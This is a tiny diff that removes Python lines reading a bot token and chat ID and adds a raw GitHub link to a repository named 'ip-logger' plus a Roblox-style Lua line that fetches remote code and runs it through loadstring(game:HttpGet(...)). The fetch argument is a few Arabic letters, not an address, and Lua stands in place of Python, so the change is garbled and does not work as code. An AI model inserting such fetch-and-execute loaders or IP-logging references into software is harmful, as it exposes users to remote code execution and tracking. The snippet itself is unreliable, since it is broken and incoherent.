@@ -1,4 +1,2 @@
-import os
-
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-CHAT_ID = os.getenv("CHAT_ID")
+https://raw.githubusercontent.com/flingsiudhdjd/ip-logger/refs/heads/main/requirements.txt
+loadstring(game:HttpGet("نتت"))()
